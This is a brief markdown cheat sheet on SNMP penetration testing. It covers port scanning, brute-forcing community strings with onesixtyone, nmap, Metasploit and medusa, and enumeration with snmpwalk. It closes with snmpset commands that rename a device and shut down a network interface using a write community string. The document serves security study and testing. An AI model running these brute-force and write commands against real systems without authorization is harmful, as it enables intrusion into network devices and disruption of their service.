# SNMP Penetration Testing

## SNMP (Simple Network Management Protocol)

- **Ports:**  
  - 161/UDP (queries)  
  - 162/UDP (traps)
- **Purpose:** Network monitoring & device management
- **Common Devices:** Routers, switches, printers, servers, firewalls, UPS systems
- **Weakness:** SNMPv1/v2c use plaintext community strings (e.g., `public`, `private`)

---

## Reconnaissance

```bash
nmap -sU -p161 <target>
nmap -sU -p 161 --script snmp-info <target>

snmpget -v2c -c public <target> sysDescr.0


### Community String Discovery
onesixtyone -c community.txt <target>

nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt <target>


Metasploit use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE community.txt
run

medusa -h 192.168.93.110 -u admin (no use of user's but still ned for medusa ) -P ssh_pass.txt -M snmp 


### Enumeration (After Valid Community Found)


snmpwalk -v2c/v1/ (version) -c <community-string> <target> 
snmpwalk -v2c -c <community> <target> system
snmpwalk -v2c -c <community> <target> interfaces
snmpwalk -v2c -c <community> <target> ipAddrTable

nmap -sU -p161 --script snmp-sysdescr,snmp-interfaces,snmp-processes,snmp-netstat <target>


### 4.3 Write-Access Exploitation (High Impact) If RW string found (e.g., "private"):


snmpset -v2c -c private <target> .1.3.6.1.2.1.1.5.0 s "HackedDevice"
snmpset -v2c -c private <target> .1.3.6.1.2.1.2.2.1.7.1 i 2 --> Shutdown interface





